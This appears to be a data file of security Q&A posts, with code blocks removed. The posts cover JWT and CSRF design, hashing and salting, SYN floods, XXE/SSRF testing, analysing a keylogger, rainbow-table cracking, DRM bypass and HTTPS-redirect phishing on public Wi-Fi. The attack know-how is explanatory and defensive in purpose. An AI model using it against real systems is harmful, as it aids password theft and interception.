this flaw and it doesn't seem soo much of a big deal to them.",53,408,1,True

MySQL Internal Encryption Algorithms are not Safe MySQL provides many algorithms such as AES, DES, SHA-1 and MD5 algorithms. Among these algorithms, MD5 and SHA-1 are proven to be not safe as they have been cracked. Also, for AES algorithms, the current MySQL 5.6 version generally available provides only the ECB operation mode which is also proven to be unsafe. 2. MySQL Internal Encryption Functions does not Provide Key Management When encrypting data, not only is the encryption itself important, but also managing key is important. The importance of the key cannot be stressed strongly enough when encryption matters. Most encryption solutions however do not pay much attention to the key. When using MySQL internal encryption functions, the key is exposed to the source, thus no proper key management exists.",279,291,2,True

","The design of the application is simple: User Input > Serialize as JSON > Client-side Encrypt > Upload to server The object being stored is structured like this: {code-blk} or the field names. The user is allowed to create as many objects as they want, and each object can be large (e.g. 10MB). The problem then is that a user could store arbitrary data in the encrypted blob, and the server would have no way of verifying if the uploaded data is a valid object or not. They could (ab)use the server as a cloud storage alternative to Dropbox, S3, etc., instead of for its intended purpose. Ideas for mitigation that I have so far: Network rate limiting per user/IP address. Rate limiting number of objects per user. Requiring proof of work for each object. Require CAPTCHA input every X object. Ideas that might work in similar cases but not this one: ""Proof of space"" will not work in this case because the client is not expected to keep a copy of the objects they upload. Requiring payment for each object or unit of storage will also not work in this case because the application is free. The mitigations I listed definitely help but do not eliminate the possibility of abuse, and each one has detrimental effects for legitimate users.

From there I was able to determine the origin and destination of the attempts of all these RDP attempts. I ran procmon on the origin machine and matched the event from the netlogon file (on the PDC) to the correlating event on the destination machine. I took the source port used which was logged in the event viewer (security) on the destination machine and matched filtered procmon using that port num. That gave me the process/PID of the culprit which was a network management service used by ""Advanced Monitoring Agent""/RMM which is an MSP software by solarwinds (I looked up the PID in Task Manager). So for some reason the MSP agent was trying to RDP using the guest account. I have went ahead and uninstalled it from all the local users machines and servers.

","I have been thinking to try out JWT as an alternative to the old session based authentication for performance reasons (i.e. no additional SQL lookup for session id in database just to get the user id for each and every HTTP request) and usability reasons (JWT is gonna be used in HTTP headers instead of cookies so that my app can be used as RESTFUL API and accessed by non-browser clients like mobile apps, also adding JWT in HTTP headers eliminates the danger of CSRF). Since the payload is signed with a secure HMAC like SHA256, it's nearly impossible to forge the payload. Additionally, the user id itslef isn't really a secret and is used publicly by the app. I am thinking of using a payload that is something like this: {code-blk} is a unix timestamp at which the JWT was created and this can be used to expire the JWT message and also harden the security by randomizing the hash for the same id. My question is, assuming that I am going to apply strict HTTPS connection for my app in production, is using this unencrypted payload secure enough to verify user's identity and initiate unsafe methods like POST methods (e.g. follow a user, unfollow a user, etc...) that's as secure as the session based authentication?

Update: A better comment about the second approach in Since Visual Studio 2012, the anti-CSRF mechanism has been improved.

","Many API's (services) today use OAuth, HTTP Basic Authentication or API keys to authenticate their users. My goal is to find a simplistic secure way to authenticate users in a client-side webapplication in a  way for one service. Authentication methods Here's my view on some of the authentication methods: seems like a great solution, but it looks very complicated to setup and seems overkill for just one service. According to  ""HTTP Basic authentication is not secure and should not be used in applications"". Using plain API keys in a client-side webapplication does not seem like an improvement in comparison to HTTP Basic authentication. Using encrypted tokens My alternative idea is to use encrypted tokens which can be verified by the service. The token's plaintext will contain the username, password & the expiration date of the token. The plaintext will be encrypted using a secret key which is only known by the server. The plaintext will be encrypted on the server using AES in GCM mode, so that the integrity can't be manipulated. The user needs to login with his/her username and password to receive a token. This token is send on every request and can be verified on the server. To illustrate: {code-blk} Verification Verification can be done by: Decrypt the token using the secret key. Verify username and password. Check if the token is expired. Pro's Possible pro's of this approach: Tokens can be stored in localStorage to mitigate against CSRF attacks and users are able to logout by clearing the localStorage. Plaintext login information is not send on every request. Tokens can expire. Cons Possible cons of this approach: More load on the server by decrypting every request. A token is bound to a specific server. What do you think is a good solution? Do you know other good alternatives?",78,416,3,True

","I have a REST API that allows authenticated users to read data about their own account and make changes to their accounts. For authentication I use JWTs stored as httpOnly cookies. To protect against CSRF attacks, the REST API also supplies the client with what Angular calls an ""XSRF token"". Angular's method of CSRF protection is to take the XSRF token your API creates and re-submit it back to the API with each request in an ""X-XSRF-Token"" header. It's up to your API to determine whether to allow the request or not. A script running on a hostile website would not have access to the XSRF token and so would be unable to submit it along with any CSRF requests. When I went to implement my front-end requests in Angular using HttpClient, I noticed that the HttpXsrfInterceptor doesn't send the X-XSRF-Token header with GET and HEAD requests. From the opinions I've read online, CSRF protection is not needed for GET requests because they don't (or they shouldn't) modify any data. The most a CSRF attack could do with a GET request is have the REST API send sensitive data to the user's web browser. The hostile website wouldn't be able to see that data. Example 1: CSRF GET If a hostile website tries to issue a CSRF GET request like this: {code-blk} Some CORS policies would stop this, but other CORS policies would still let it happen. It seems that requiring CSRF protection on GET requests would mitigate this vulnerability. Am I missing something important?",220,398,1,True
3919,"HTTPS Client Authentication

HTTPS Client Authentication requires the client to possess a Public Key 
Certificate (PKC). 
If you specify client authentication, the web server will authenticate the 
client using the client’s public key certificate.
HTTPS Client Authentication is a more secure method of authentication than 
either basic or form-based authentication. It uses HTTP over SSL (HTTPS), 
in which the server authenticates the client using the client’s Public Key 
Certificate (PKC). Secure Sockets Layer (SSL) technology provides data encryption,
server authentication, message integrity, and optional client authentication for a 
TCP/IP connection. You can think of a public key certificate as the digital 
equivalent of a passport. It is issued by a trusted organization, which 
is called a certificate authority (CA), and provides identification for 
the bearer.
","Try to expose protected REST API without exposing credentials in the Client (JS Code). All solutions that come to my mind, can be reversed and the Attacker can reconstruct them. Are there any proven solutions? Best practices? Ideas, I came up for example: Obfuscating credentials Hashing client side set of elements and comparing server side to make sure the Client is untouched (not used by the Attacker) can be reversed. Unfortunately, HTTPS authentication does not come into play, since the website accessing the REST API (Client, JS Code) should be open to the public. I cannot request each Client (Website visitor) to request a PKC (Public Key Certificate) {code-blk} I want to prevent that people will obtain credentials and scrape/perform many request to REST API. I guess, our only solution is than IP based throttling? To punish bad Clients. Thanks in advance! Update 1: After Discussions with @ThoriumBR, came up with this solution. Not optimal but should be better than nothing. Design: Client Website <-> New API (Proxy) <-> Old API Flow: Wrap old API (private) against new API (public, in diagram above Proxy) 1) Client Website makes Request to Proxy 2) Proxy Sends CAPCHA back 3) Client Website complete CAPCHA 4) Proxy creates JWT (assign capcha intrval in JWT for example as 10 (capcha_int:10), assign deviceid: fingerprint (to know the users from the same IP)) sends it back to Client Website. Proxy checks also for abuse, if deviceid is misbehaving, it will be blocked. 5) Website Send request to Proxy with JWT 6) Proxy check JWT, if capcha interval (capcha_int) is equal 10 send CAPCHA, resets it, if it misbehaves, if not, sends request to old API 7) old Api sends reponse via Proxy to Client Website IPs will be IP based Throttled for abuse.

","I've recently asked this question on SO. As the question was not answered yet, I've come up with an approach. But I wanted to check if there is not any security flaw in this solution. Question I had written a session management plugin in node.js for Muneem web framework. Here is pseudo code to create a new session; {code-blk} As you can notice, I'm renewing a session when it is valid and satisfy certain conditions by deleting the previous session. But I don't update it in the store immediately. Instead, I update the session information in the store and set the cookies when the response is being sent to the client. Now suppose a condition, when the server receives multiple requests with the same session-id which is eligible to renew. I renew the session on the first request. Scenarios Session is not updated in store. So I'll renew the previous session with another new session id. A user will have multiples session-id in this case. Session is updated in the store. Now, the previous session will not be available in the store. I'll have to ask the user to login again if it is authorized session. Or I'll create another session. Solution To solve this race condition, I was thinking to create a DB table where the records can self-expired after a fix duration, say transition-time. When a session should be renewed, we do an entry in expired-session table with the old and new session id. Rest of the operations are the same as per above pseudo code. Now, if the next request with expired session-id reaches to the server within transition time, say 10 secs, then we'll fetch new session-id and continue the session. is the full code, in case we need.",229,407,1,True

","I am working on a round based web game where only one client/player at a time can perform an action. Throughout the game every player will have a websocket connection to the server. The client will send simple JSON messages like {code-blk} So if the server gets a message with the correct hash it must have been an action from the authorized player. A new hash will be computed for every message. Method 2: I thought method 1 will be not secure enough. There is still a chance another player might guess the hash. So I thought I could implement it this way At game start server and client will agree on a secure key (like in Diffie-Hellman key exchange) Server creates hash and encrypts it using for example AES and the key and will send it only to the authorized client. Authorized client will decrypt the hash, add the action, encrypt the JSON message and send to server. Server will decrypt the message and check the hash with the original hash it send. Although I am not sure if method 2 is actually more secure than method 1 and will prevent wild guessing. Plus I will feel uncomfortable implementing a method to securely exchange keys.

The server will then track the websocket connection of the currently authorized player and ignore messages from all other connections. Is this safe against man in the middle attacks or other attacks?

I'm a reasonable programmer & I want to make my own program to hold passwords as an exercise. Why not use any of the already existing password managers? I want to make one myself.

","new user here. I've tried searching for an answer but I don't think I know the correct terms to search for. I've tried things like ""bcrypt same password different hash"" but can't find an answer to my question below. Preamble: From what I have searched online, bcrypt returns the hashpw function with a byte-type string concatenation of the salt appended with the actual hash(salt+password). My Question: Why does bcrypt recognize it as a password match when I provide it with another generated hash from the website ? What is bcrypt.checkpw() actually comparing? If I were to check if the user's input matches the salt+hash on the server, how should I do it? bcrypt provides a different salt+hash every time the function runs, and apparently salt1+hash1 matches salt2+hash2 when generated from the same string. I'm really confused with how this works. {code-blk}",329,232,1,True

Which I don't really see the use of, ) It uses a static hardcoded salt that is the same for everyone (which will generate the same hashes for users with the same password) No double salt (ties in with the above) It uses SHA1 instead of SHA2 (We don't need to stick to sha1 for any compatibility reasons or anything) Now as far as i'm aware SHA1 isn't truly unsecure (yet) but has already had collisions happening, and isn't completely secure anymore.

Acquire a valid certificate per the following guidelines, before you enable secure LDAP. You encounter failures if you try to enable secure LDAP for your managed domain with an invalid/incorrect certificate.

    Trusted issuer - The certificate must be issued by an authority trusted by computers connecting to the managed domain using secure LDAP. This authority may be a public certification authority (CA) or an Enterprise CA trusted by these computers.
    Lifetime - The certificate must be valid for at least the next 3-6 months. Secure LDAP access to your managed domain is disrupted when the certificate expires.
    Subject name - The subject name on the certificate must be your managed domain. For instance, if your domain is named 'contoso100.com', the certificate's subject name must be 'contoso100.com'. Set the DNS name (subject alternate name) to a wildcard name for your managed domain.
    Key usage - The certificate must be configured for the following uses - Digital signatures and key encipherment.
    Certificate purpose - The certificate must be valid for SSL server authentication.

","I'm hitting a roadblock when it comes to security for managing scoped permissions for servers. Right now I run a community which can create sub-servers. So community A can allow certain users to moderate it, change settings, invite users, read logs etc for their own sub-server, but not others. My current system has a global user, this user has permissions structured similar to this: {code-blk} A single user has access based on 'resources', and when they attempt to modify, read or do anything through my API or Socket, i check if they have access to the resource they're modifying. This is pretty easy for me to manage permissions through the API as i intercept the request, grab the resource and see if they're permitted to perform the action they're trying to do, such as read a log or invite a user and then either reject the API call before it ever reaches the controller. The main issue I'm now having is with maintaining multiple means of access, I now have the REST API and a WebSocket which can access the same kinds of data depending on where they're accessing the guild from. So now the permission system has become significantly more complicated and isnt as easy as intercepting a request from the REST API and blocking it, i now have two permission checking systems which I feel is wrong and breaks the DRY Principle. I'd like to learn if there are any industry standards for multiple means of accessing data. Should I build a resource manager which always needs credentials and the target resource, and then have a system user for internal access or is there an easier standard for tight nit control over who can do what based on the permissions they have for a specific resource.

Sorry the original condition of my document is badly scanned before it was handed to me. I have several discussions with my friends, and they suggested this solution for (a). Fill the first 50 characters of B with non-null characters and the 51st element with a null terminator. The length of the string represented will be 50, as shown from strlen(B), this causes the branch with strncpy(A,B,C) to occur, which will copy the first 50 characters of B into A. Later on when the loop is called, number of loops equal to the length of B, there will be a Buffer Overread as it reads outside the bounds of the array A. As C is an unsigned char with bounds 0 to 255 while strlen returns unsigned int with bounds 0 to 2^32 – 1, the extent of Buffer Overread will differ. (b) will require me to assume this is the case in (a), and will require me to answer it like this: When printf() is called, it will result in an infinite loop as with the same configuration, the '\0’ cannot be found in the array.

The security of a 256-bit elliptic curve cryptography key is about even with 3072-bit RSA.

","I posted this question already on SO, but as it is not really a programmin question I thought it might be a better place to ask here: I want to setup a new SSL certificate store for generating SSL certs (server certs (nginx) and client certs (linux/windows devices)) I'm searching already for quite some time and I'm not sure I fully understand. especially as some articles are a few years old. Many articles just talk about RSA and seem to recommend 2048 or 3072 though mentioning that 2048 is today probably still the best choice (  ) I found for example one Article (  )  but it seems to talk mostly about key encryption as @dave_thompson_085 pointed out on SO stating in the section ""Asymmetric (""Public Key"") Encryption"" {code-blk} However they don't mention the impact on server CPU usage compared to RSA 2048/3072/4048. I also didn't find many other articles suggesting to switch to Elliptic curve algorithms. Another article )  _ tries to promote ECC instead of RSA, but comments on the article state, that ECC is less safe than RSA if quantum computers kick in. And the article cites nowhere numbers for what  performance improvement to expect when using ECC. mentions potentially legal issues and fear of being sued. Though CPU usage is not a major issue Id still like to get some idea as I'd like to use the same CA and cert store also on devices like raspberries. So what is today the best choice for certificate key algorithms and key sizes for server certs (old internet explorer not required but PCs, tablets, mobile phones being used today should be able to connect to the server and what's the best choice for client certs (will not be used on mobile devices)? I kind of tend to RSA 2048, but I'm really not that sure I interpret all the articles correctly  and don't like to make choices based on feelings.",163,447,2,True

I looked at: , a 2012 description of the boot process. This includes the following, which reassures me somewhat by describing a built-in key and possibility to override it, but does not explain the sporadic appearance of the prompt: The shim then goes on to verify that the GRUB2 bootloader it wants to load is trusted. It will not use the SUSE KEK1 nor the Microsoft cert for this. In a default situation the shim will use an independent SUSE certificate embedded in its body. In addition, the shim will allow to “Enroll” additional keys, overriding the default SUSE key.

","How can you do a CRSF attack on express if it only accepts JSON? Sample Node app: {code-blk} but my understanding is that CSRF can't be done with fetch- Browsers send preflight requests when using fetch. If the preflight request shows that the origin isn't allowed, it will not send the full request. So it will always fail with a CSRF request. But I'm not so certain of this. So is there another way to send a CSRF attack with user inputs? Or in this case, is there no way to do a successful csrf attack?",226,147,1,True

At first, it sounds like this could lead to deterministic outputs (where two users with the same password receive the same hashed master key), but earlier in the paper it says that the master key is generated using PBKDF2, passing in the master password, and the email address of the user as a salt (and there's some key stretching as well). So the output of the master password hash should still be non-deterministic due to the salt (email for a user) applied when generating the master key.

","There's a web application on a server which I have full access to which accepts POST requests on a REST endpoint. The request payload is expected to be an XML document. For request routing and load balancing the server makes use of HAProxy, which also takes care of the TLS settings and has the certificate chain and private key in its setup. Recently some posts have been failing. The response has HTTP status code 200 but its payload is an HTML document rather than the expected XML that the service ought to return. It takes this form: {code-blk}). I see no logging for the call on either the web service or even in the HAproxy logs, while the logging is set up so that if the POST made it to the server we'd expect to see at least something in HAproxy. If the POST is replicated with curl on the server itself, bypassing HAproxy and external networks, it succeeds. Trying the call with Postman and the ""problematic"" XML, I can see that the certificate for the TLS handshake is the one set up in HAproxy, so no replacement from a MITM node. The first thing I'm wondering, of course, is why on earth a POST would get blocked because of some perfectly fine entity references in it. It's not an XML bomb, the XML is well-formed and I don't see an issue with the HTTPS POST itself. Looking online for that particular HTML response it seems like a firewall is the most likely culprit. But that raises a second question. How could some node along the network block the POST based on its contents if it's performed over HTTPS? The payload ought to be encrypted. And the TLS connection is established between the client and HAproxy on the server. EDIT: We contacted the hosting provider who confirmed there was an issue with RPaaS. They've made a change and the requests get through now. Which still leave the question of how a connection over HTTPS could have requests blocked based on content.",103,477,1,True

","A bit of background: I am a web developer and sometimes i integrate some form of external API in my web applications. It's the second time already that i find something strange: some APIs instead of accepting messages through HTTPS, require that i send the message over HTTP using some encryption algorithm to encrypt it. This algorithm is custom made by the API provider and always involves multiple ""rounds"" of encryption, i think to make the message as secure as possible. I can't really think of a good reason to why this solution is better, so my question is: Is there any advantage in using HTTP with an encrypted message instead of HTTPS? Is it common to do this? UPDATE Unfortunately i cannot share much about the API but here are some more details: Basically i need to implement a code snippet given by the API provider that is used to encrypt the HTTP payload, it goes something like: {code-blk} But that's outside the scope of the question, i know for sure that a message needs to be encrypted using that function and sent over HTTP.",31,244,1,True

","We have a Web API which uses the REST semantics and is protected using the Azure's Application Gateway using a Web Application Firewall.

Also, since the Web App allows users to enter arbitrary data in the sense that things like double quotes etc, are allowed, I don't want to add hundreds of rules (App Gateway WAF allows 100 custom rules I believe) like this.

","How does network segmentation affect network packet sniffing, man-in-the-middle attacks and interconnectivity of devices? I am mainly interested in understanding the possibilities of network malware or a ""packet sniffing"" hacker. Let's have a simple network and the two questions: Question 1 device isolation: Devices are completely isolated from another when they're ""behind"" a router? (assuming that the router has at least a simple firewall blocking incoming connections originated from WAN + no port forwarding) E.g. devices connected to ""Router1"" resp. ""Router2"" are completely isolated from the devices connected to the ""Router2"" resp. ""Router1"" and also from the Router0 itself. Devices connected to ""Router3"" are completely isolated from devices connected to Router1 and Router2, but they can connect to the devices in LAN2 due to ""bridged"" ports on Router2 + to the devices in LAN0 due to ""bridged"" ports on Router0. Right? Question 2 eavesdropping and MITM: If an attacker wants to listen or man-in-the-middle the traffic (lets, for now, ignore any encryption - https, VPN services etc.), the attacker's device must be connected directly to a node, where the specific traffic flows through, right? Thus an attacker from LAN0 can eavesdrop or influence traffic from any device from LAN1, LAN2 and LAN3 because their traffic flows through the same node he is connected to (bridge on Router0 in this case)? But an attacker from e.g. LAN1 cannot eavesdrop or influence traffic from other LANs (LAN0 LAN2, LAN3) because he is connected to a different node (and I assume he is not able to listen or MITM the traffic on a different node [Router0] if 1. he isn't directly connected to the node or 2. he doesn't tamper with the device itself). Am I correct? {code-blk}",260,480,1,True

Original question: I'm new to networking and have been reading into how OpenVPN constructs its packets and a bit more of the technical details of how tls-auth is implemented. From what I have read, all the packets for the TLS handshake are protected with a HMAC signature, for which the key used to produce this signature is derived from the static key given in a client config. There are a few things that are confusing me though, so I just have a few questions: At first, I believed only the packets used for authenticating with TLS (hence the option name) are given this HMAC signature, however on  it states: {code-blk} Or would it be inside the appended payload? Update: Okay so now I know that it is all the control channel packets that use this additional HMAC. I've also been able to check the packet structure properly, and with tls-auth there seems to be an extra HMAC, packet ID, and 'net time' appended after the session ID. I've discovered that the key derived for HMAC production from the static key is 4 lines down when no key direction is specified, with the length of the key being respective of the auth type (eg: 160 bits worth of chars for SHA1) from . The only thing left on my mind is what parts of the packet count as the ""encapsulation header"" from which the HMAC is calculated.",198,383,1,True

","I am trying to test XXE and SSRF in SOAP webservice.

Moreover, the computer I use for testing has no Internet access, so when I check for SSRF this library tries to connect and gets a connection timeout, and returns an exception. Because this library ends execution with an exception the request is sent without WS-Security signature, so the server just rejects the request. The same problem without a solution I found here: I also tried to use JMeter, which has extention for WS-Security but with exactly the same result. Example of connection error because of an attempt to resolve entity (SSRF attack). Do you know any tools that can be used to test XXE in SOAP web service, where WS-Security is required? Is it a correct behavior of libraries to sign requests with WS-Security to try to resolve external entities or it is just a vulnerability/bug in these libraries? Maybe WS-Security shouldn't sign XML with entities declaration? I can't find anything about this on the Internet and I have no idea how to make this test.

","Yes I can. IPv4, due to the size of the address pool, has long had a technique called Network Address Translation. In a simplistic view, let's assume you are allocated the (invalid) IP address for your router {code-blk} There isn't really enough space in these boxes to write out the full addresses, but in the IPv6 model, the router performs its routing function (it gets packets to the computers on the LAN) but crucially here it routes both from and to the internet, rather than routing / NATing outwards. The effect of this is that the default case for IPv4, namely that home computers aren't directly accessible by nature of the fact they have no IP address unless the router knows about the connection goes away. The computer becomes addressable from the internet, much like a server. Clearly, such connections can still be firewalled, with firewalls denying all incoming (non-client-initiated) connections, however, you've lost needing to explicitly configure your router to route internet packets to you. If the firewall doesn't filter the incoming packet, the client better be able to cope with it. There is, therefore, a slightly increased security risk to home users using IPv6. I expect (hope?) most home routers will come configured with this firewall setting. As such, while the risk is slightly increased, it is still probably dwarfed by the threat from browser-based exploits (the ""outbound stuff"").",220,337,1,True

Not programmatically I don't think - they happen because of something the guest is doing (conditions for exits supplied by the VMM) rather than in direct response to an opcode. Again, ""breaking out"" of a VM is a loose term. Users of virtual machines should also be wary of things like network emulation - if your guest and host can talk to each other over TCP/IP and your host IP stack has a vulnerability in it and code on the guest can exploit it - you could still be compromised.

","is a good technique (though a 1000 doesn't buy you much when simple hashes - md5/sha1 can be calculated at a rate of ~ 1 billion per second per gpu). For the sake of simplicity, I'm going to give you a concrete example.  You have a web app and I'm going to assume the malicious adversary managed to get access to your server.  This could be an admin who's secretly evil, someone who broke in to your server room, a janitor who has keys, or a random hacker who managed to use some exploit to get in. The adversary first manages to export the stored usernames and their hashes of passwords from your database.  Then they look at the running code of your web server for how it checks passwords.  It sees something in the authentication section of your web server code that looks like: {code-blk} The attackers say aha! the passwords in the db are hashed 1000 times and unsalted.  They then generate hashes at a rate of a billion per second (so can check a million passwords in a second) with their modern gpu.  So in about 1 day of gpu computational time, they have gotten hashes for 86.4 billion passwords (36 bits of entropy) and constructed a rainbow table on their terabyte hard disk. They then look up all the hashes in the rainbow table and find many matches; now with the plaintext password and the user name, they try breaking into other services of those users where they may have reused passwords.  If the passwords were uniquely salted, they would have to generate a new rainbow table for each password making the brute-force attack much less successful (e.g., one day or so of GPU time to brute force each simple password).",249,422,1,True

The reason I mention LUA is a good language to learn is that it is the scripting engine for MANY popular security tools. This is a very good reason alone to learn this language. Some of the langauges include: NMAP (Network mapping tool) Snort (Open source IDS) Wireshark (Packet sniffing tool) Vim (Very popular unix text editor) Cisco ASA (firewall, IPS, VPN) Network services tools (Apache, lightHttpd, FreePop) On a side note: Even Blizzard major hit World of Warcraft has support for LUA scripting inside the game :) To whomever that may be relevant to. I am a bit biased on Python after I've started reading the book """". I agree with many of the points from this book why it is good to learn this langauge for a hacker (commonly known as security specialist :)). Quoted from Amazon Python is good language to learn because: it's easy to write quickly, and it has the low-level support and libraries that make hackers happy.

","Database Layer The multi-schema approach is OK but as always the devil is in the detail. One major isolation technique that is underappreciated is separate schemas for the data owner and for the web-app to access.

Allows the application to hide data (behind packages or views). You can use synonyms to map between web-app user and table owner schemas. An Example Setup to get you started. {code-blk} Authentication Layer The authentication of users can be isolated into a sso / ldap server. This reduces the impact of a compromise of your web-app. The surface area of the authentication service is much much smaller than the whole system.

6177,"Client --------- SYN -------> Server
Client <------ SYN,ACK ------ Server
Client ------- ACK,... -----> Server
","Simple DoS-attacks use up the bandwidth. But more sophisticated attacks use up other resources such as CPU time and memory. A SYN flood is targeted at using up memory, (and in some cases CPU-time on hardware firewalls). For an attacker, however, it is easier to flood a victim with SYN-packets, if the victim has a huge bandwidth. How is a TCP connection established? TCP uses a three way hand shake: {code-blk} The traditional way to handle the creation of a connection is this: After the Server received a SYN packet, it has to allocate some memory to store the information about the connection (e. g. client IP, client port, server IP, server port). It acknowledges the SYN packet by sending a SYN ACK back to the source IP-address specified in the initial packet. A SYN flood consists of lots of SYN packet for which the server has to allocate memory. The client can just send and forget about them. Furthermore the source IP-address can be set to anything (unless the ISP of the attacker has filters). Why does the server have to remember the half opened connection? The server needs to verify that the sender of the ACK-packet in step 3 is the one who sent the SYN-packet and received the SYN-ACK packet. This is the way TCP tried to protect against forged IP-addresses and packet injections. (The protection does not work against an attacker who has access to a router through which the packets travel). How to protect against SYN-floods? Instead of allocation memory and store the information about the half opened connection, the server sends the required information back in the TCP-sequence number field in a cryptographic save way. So when the final ACK-packet is received, it can extract the required information, verify it and establish the connection. Wikipedia has a good article on .",41,451,1,True

","The license generation method isn't really that important, as long as it's non-trivial. The trick is how your client verifies that the license is correct. Let's say you do something like this: {code-blk} to 1 and return, so it never even bothers to ask your server for license validation. So, how do we solve this problem? Unfortunately for you, we can't. You're running into the DRM problem, which essentially states that if you hand someone some data, they can always change it. No matter how much you obfuscate your code, it's possible for the user to eventually reverse engineer it and work out how to make changes, or extract data. If you encrypt content, you eventually have to have the key on the system in order to decrypt it, so there's always a way for the user to extract that key and decrypt the content permanently. The best you can do is make it difficult, which involves a lot of time and effort. Eventually your software will be cracked and end up on a torrent site somewhere. It sucks for developers using this kind of business model, but it's the world we live in. My suggestion is that you go down one of two routes: Create a basic licensing system that works, and accept the fact that some people will pirate it. Serve your real customers by spending your development time actually making improvements to the software, rather than implementing and maintaining draconian DRM systems. Alter your entire development and business paradigm, so that your product is a service rather than a software application.  has been very successful, since it's (practically) impossible to pirate services, and the model allows you to make real-time changes to your codebase, and perform analytics on usage. If you go for option 1, don't involve a server for validation. It adds complexity, provides no added security, brings some privacy concerns, and makes it impossible for your users to use your software if your licensing server is down. Just stick with something simple, e.g. a hash of the username and a secret value on the client side. It's trivial to break, but it gives a minimum barrier to piracy.",329,490,1,True

The keyAgreement usage flag would appear in a certificate which contains a DH key, not a RSA key. nonRepudiation is not used, because whatever is signed as part of a SSL/TLS key exchange cannot be used as proof for a third party (there is nothing in a SSL/TLS tunnel that the client could record and then use to convince a judge when tring to sue the server itself; the data which is exchanged within the tunnel is not signed by the server).

IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that the RSA host key has just been changed.
","Usually, people recommend to use a single private-public key pair everywhere (if we're not talking about a possibility of compromising the private key) Note that there are two key pairs involved in an SSH connection: one to identify the server host (the server has the private key); one to identify the user (the client has the private key), if using public key authentication. The recommendations you cite are about user keys. Having a single private key per user is a viable model, though I don't particularly recommend it (the cost of having separate key pairs per host or site isn't that high). Server keys, on the other hand, are never duplicated. They are generated afresh when the SSH server is installed. On this topic, beyond the posts you've cited in your question, see also In the attack you describe, you've mixed up the roles of the keys. These are the host keys, {code-blk} The attack is thus impossible in this scenario (unless the user goes out of his way to bypass the check — OpenSSH purposefully makes this difficult).

Since PC1 has no prior knowledge of any association between the name S2 and a cryptographic identity, nor any way to contact a trusted third party who knows such an association (i.e. a public-key infrastructure), there is no way to prevent this man-in-the-middle attack.",201,338,1,True

Part of the SMTP protocol includes a set of full message headers that always includes the return path of the message, which is the email address that actually sent the message. Not only that, but IP addresses also have a definitive geographical region they're assigned to. So you can catch these discrepancies with a bit of digging. Take, for example, said dramatization. It mentions that the email is coming from whitehouse.gov. Here's its IP address: {code-blk} So that ""all"" is where you define just how strict your SPF record is. But whether or not the SPF record is actually used to determine the spoofiness of an email is completely up to the receiving email service. So there you have it. SPF in a nutshell. So yeah.

","The keylogger looks to be sending email using Gmail but the SMTP communication is encrypted with TLS (SSL). {code-blk} You can use  on the host running the keylogger to intercept the SMTP messages before they are encrypted with TLS (SSL). Fiddler intercepts Windows WinINET-based applications so it will not intercept all SSL connections. Fiddler is a Web Debugging Proxy which logs all HTTP(S) traffic between your computer and the Internet. Fiddler allows you to inspect all HTTP(S) traffic, set breakpoints, and ""fiddle"" with incoming or outgoing data. Fiddler includes a powerful event-based scripting subsystem, and can be extended using any .NET language. If the keylogger sends email it means that it will collect keys for a certain amount of time and then send the email. Which means that it will have to store those keys somewhere. Tracking file writes for that keylogger can point you to it's cache and maybe the key file will indicate if the keylogger is targeting Runescape or the user. I recommend  for tracking file writes. A different way of finding the destination email address is debugging the keylogger. You could start with a memory dump and a search for strings. First you identify the keylogger process by tracking the writes that happen after key presses, then use  to search the strings from the memory dump of the process. and a bit of patience can be useful for debugging the code of the keylogger by setting breakpoints on SMTP functions and then inspecting the memory for email addresses.",65,356,1,True

","Shallot is an older program, there are newer alternatives available now: Scallion - uses GPU hashing, needs .NET or Mono: Eschalot - uses wordlist search, needs Unix or Linux: Eschalot can find longer human-readable names like seedneedgoldcf6m.onion, hostbathdarkviph.onion, etc. The performance chart quoted above is a bit obsolete now, 8-10 character long .onions are easy enough to find. There was a discussion back in the day, when shallot first surfaced, about whether custom names for hidden services are bad or not. Problem number one: generated keys have a much larger public exponent than the standard keys produced by TOR, which puts a somewhat higher load on the TOR relays. Answer: it was concluded that the difference is negligible compared to the other encryption tasks the relays perform constantly. In eschalot, the largest public exponent is limited to 4294967295 (4 bytes). Problem number two: TOR developers can decide to filter and block all the custom names. Answer: yes, they can, but they have not yet and there is really no reason for them to do so. They can just as easily change the standard for the random names too and cause chaos and mass exodus on the network. Problem number three: generated names are easily spoofed, since the visitor clicking on a link somewhere out there can be tricked by the seemingly right .onion prefix without checking the whole thing.

There's a lot of important information that can be snooped from those. Phish all your encrypted traffic Usually it's hard to spoof HTTPS because you need a valid certificate for that to work. However, many times you type in an HTTP URL in the address bar and it redirects you to the HTTPS equivalent. For example, when you type {code-blk} in the URL but really points to a completely different server. Both mobile and desktop browsers seem to allow 301 redirects without a fuss.Desktop browsers make a fuss when there's an unauthorized HTTPS redirect, but mobile browsers don't. On modern desktop browsers, it is easy to identify when this is happening, for example, Chrome shows this: when on an https connection. If you are alert, you'll notice if the HTTPS is replaced with HTTP on a desktop browser(since the icon is no longer green), but most mobile browsers don't seem to have any way of indicating a secure connection. This problem can be solved (on the site side) by using HSTS, and on your side by using bookmarks and keeping browser history. Unauthorized access to device Depending on your sharing settings (and what you set the network as -- always, always use ""Public"" for networks you don't trust), it may be possible to access your Windows filesystem.

LFSR is used in: DVD encryption (also known as CSS)  2 LFSR GSM encryption (A5/1.2)  3 LSFR Bluetooth (E0): 4 LFSR The hardware for the above is widely deployed and therefore hard to update, or bring up to modern standards.  All of the above are badly broken and should not be trusted for secure communications. Attack: Since the key is broken into two sections during encryption (17 bits, and 25bits) and those bits are used to encrypt the same cipher text, it's possible to use knowledge of the MPEG format, and bruteforce a 17bit key to extrapolate what the 25bit key is. This is hardly new, but FOSS is easy to find that demonstrates this issue. Solution: The  (in 2008) qualified 5 stream ciphers that should be used.  A notable difference is that instead of using a Key with an IV, the ciphers use a Key, a nonce, and a counter.  Salsa20 operates this way and is designed to be used in both hardware and software easily. Specifically, it's included in the x86 SSE2 instruction set.

